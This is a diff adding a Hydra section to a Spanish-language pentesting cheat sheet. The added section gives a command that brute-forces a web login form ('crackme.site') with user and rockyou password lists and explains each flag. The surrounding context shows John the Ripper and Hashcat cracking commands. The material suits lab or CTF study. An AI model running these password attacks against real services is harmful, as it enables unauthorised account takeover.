@@ -279,7 +279,19 @@ consiguiendo os shell:
     john -wordlist=<wordlist> <file to crack>
     john -wordlist=<wordlist> -rules <file to crack>        # reglas utilizadas para crackear palabras como cat con difernetes combinaciones como c@t,caT,CAT,CaT
    
+ ## Hydra  
    
+    hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt -f -V
+    
+ http-post-form = tipo de ataque
+ /login.php = destino de ataque
+ usr=^USER^&pwd=^PASS^ = nombre de los login form 
+ invalid credentials = mensaje que aparece cuando el login es incorrecto
+ -L = lista de usuarios a testear
+ -P = lista de passwords a testear 
+ -f = si encuentra una combinación correcta, deja de atacar
+ -V = verbose
+ 
  ## Hashcat
  
     hashcat64.exe -m 0 -a(ttack) 0 -D2 example.hash example.dict (-r rules)
